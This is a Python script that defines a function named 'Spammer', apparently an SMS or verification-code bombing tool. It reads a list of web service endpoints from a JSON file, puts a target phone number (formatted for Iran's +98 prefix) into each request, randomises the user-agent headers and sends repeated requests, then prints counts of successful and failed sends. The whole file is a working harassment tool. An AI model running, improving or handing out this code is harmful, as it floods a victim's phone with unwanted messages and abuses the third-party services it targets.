#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author: Rvi




from email import header
import requests
import json
from fake_useragent import UserAgent
from colorama import Fore, Style
from urllib.parse import urlparse

def Spammer(phone, retry=True, logger=True):
    urls = json.load(open("src/apis.json"))
    sum_done = 0
    sum_fail = 0
    def rndHeader(header=None):
        if header == None:
            ua = UserAgent()
            header = {
                'user-agent':ua.random,
                'accept': '*/*',
                'content-type': 'application/json',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            return header
        else:
            head = str(header).replace("\'", "\"")
            head = head.replace("$PHONE", phone)
            head = json.loads(head)
            return head


    def parseBody(body):
        if body != None:
            pPhone = phone.replace("+98", "")
            if pPhone[0] == "0":
                pPhone = pPhone[1:]

            nbody = str(body).replace("\'", "\"")\
                             .replace("False", "false")\
                             .replace("True", "true")


            nbody = nbody.replace("$PHONE", pPhone) 
            try:
                nbody = json.loads(nbody)
                return json.dumps(nbody)
            except:

                return nbody
                     
        else:
            return None

    def parseUrl(url):
        pPhone = phone.replace("+98", "")
        if pPhone[0] == "0":
            pPhone = pPhone[1:]

        nUrl = url.replace("$PHONE", pPhone) 
        return nUrl        


    def reQ(address, method, body, response, header=None):
        header = rndHeader(header)
        xBody = parseBody(body)
        xUrl = parseUrl(address)
        try:
            res = requests.request(method, xUrl, data=xBody, headers=header, timeout=5)
        except:
            print("ExceptionError Return")
            return False

        resCheck = str(response).replace("\'", "\"")
        if resCheck in str(res.text): #str(res.json()): #Maybe Some Sites Dont Reponse Json
            return True
        else: return False

    def spam(tUrl):
        method = urls[tUrl][0]
        body = urls[tUrl][1]
        ret = urls[tUrl][2]
        resp  = urls[tUrl][3]
        header  = urls[tUrl][4]


        done, fail = 0,0
        if not retry: ret = 1
        for _ in range(ret):
            res = reQ(tUrl, method, body, resp, header)
            if res: done+=1
            else: 
                fail+=1
                #break #UnComment if Needed to Break After 1 Fail Request  

        return done, fail

    for url in urls:
        done, fail = spam(url)
        sum_done += done
        sum_fail += fail
        done = f"{Fore.GREEN}{done}{Style.RESET_ALL}" if done >= 1 else ""
        fail = f"{Fore.RED}{fail}{Style.RESET_ALL}" if fail >= 1 else ""
        shUrl = urlparse(url).netloc
        if logger:
            print(f"[{shUrl}]:: {done} {fail}")



    sum_fail = f"Failed Requests: {Fore.RED}{sum_fail}{Style.RESET_ALL}" if sum_fail >= 1 else ""
    sum_done = f"Successfully Sent: {Fore.GREEN}{sum_done}{Style.RESET_ALL}\t\t\t" if sum_done >= 1 else ""
    print(f"{sum_done}{sum_fail}")

